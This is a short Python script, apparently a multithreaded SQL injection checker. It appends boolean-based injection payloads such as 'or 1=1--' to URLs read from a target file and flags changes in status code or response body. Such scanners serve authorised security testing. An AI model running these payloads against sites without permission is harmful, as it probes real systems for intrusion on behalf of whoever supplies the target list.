import requests
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from urllib.parse import urlparse
import argparse

def make_request(url, domain_states, protocol, output_file):
    if domain_states[url]['unreachable']:
        output_file.write(f"Skipping checks for unreachable domain: {url}\n")
        return

    payloads = ["%20or%201=1--", "%20or%201=2--"]
    responses = []

    for index, payload in enumerate(payloads, start=1):
        parsed_url = urlparse(url)
        new_url = url if parsed_url.scheme else f"{protocol}://{url}"

        try:
            with requests.Session() as session:
                response = session.get(f"{new_url}" + payload)
                responses.append(response)

                if index > 1:
                    if response.status_code != responses[index - 2].status_code:
                        output_file.write(f"Status code changed for URL: {url}\n")
                    if response.text != responses[index - 2].text:
                        output_file.write(f"Response body changed for URL: {url}\n")

        except requests.exceptions.RequestException:
            # Do nothing when connection fails
            domain_states[url]['unreachable'] = True
            break

def main():
    parser = argparse.ArgumentParser(description='SQL injection vulnerability checker')
    parser.add_argument('-t', '--targets', type=str, help='File containing URLs to check', required=True)
    parser.add_argument('-c', '--threads', type=int, help='Number of threads', default=5)
    parser.add_argument('-p', '--protocol', type=str, choices=['http', 'https'], help='HTTP protocol', default='https')
    parser.add_argument('-o', '--output', type=str, help='Output file name', default='output.txt')

    args = parser.parse_args()

    with open(args.targets, 'r') as file:
        urls = [url.strip() for url in file.readlines()]

    domain_states = defaultdict(lambda: {'unreachable': False})

    with open(args.output, 'w') as output_file, ThreadPoolExecutor(max_workers=args.threads) as executor:
        for url in urls:
            executor.submit(make_request, url, domain_states, args.protocol, output_file)

if __name__ == "__main__":
    main()
